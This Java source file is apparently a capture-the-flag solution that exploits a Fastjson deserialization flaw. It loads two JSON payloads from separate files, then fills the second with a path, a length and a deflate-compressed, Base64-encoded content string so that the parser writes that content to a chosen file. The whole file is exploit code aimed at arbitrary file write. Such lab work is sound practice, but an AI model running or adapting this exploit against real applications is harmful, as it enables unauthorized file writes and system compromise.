package com.solution;

import com.alibaba.fastjson.JSON;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;
import java.util.zip.Deflater;

public class Exp {
    public static void main(String[] args) throws IOException {
        String step1 = new String(Files.readAllBytes(Paths.get("step1.json")), StandardCharsets.UTF_8);
        try{
            JSON.parse(step1);
        }catch(Exception e){

        }


        String path = "D:/1tmp/1.txt";
        String content = "ctf flag";
        // limit 长度可能要根据报错修改
        HashMap<String, Object> map = gzcompress(content);
        String array = (String) map.get("array");
        int limit = (int) map.get("limit");
        String poc = new String(Files.readAllBytes(Paths.get("step2.json")), StandardCharsets.UTF_8);
        String replace = poc.replace("${path}", path).replace("${limit}", String.valueOf(limit)).replace("${array}", array);

        JSON.parse(replace);
    }

    public static HashMap<String, Object> gzcompress(String code) {
        byte[] data = code.getBytes();
        byte[] output = new byte[0];
        Deflater compresser = new Deflater();
        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!compresser.finished()) {
                int i = compresser.deflate(buf);
                bos.write(buf, 0, i);
            }
            output = bos.toByteArray();
        } catch (Exception e) {
            output = data;
            e.printStackTrace();
        } finally {
            try {
                bos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        compresser.end();
        System.out.println(Arrays.toString(output));
        int limit = bos.toByteArray().length;

        HashMap<String, Object> map = new HashMap<>();
        map.put("array", Base64.getEncoder().encodeToString(output));
        map.put("limit", limit);
        return map;
    }
}
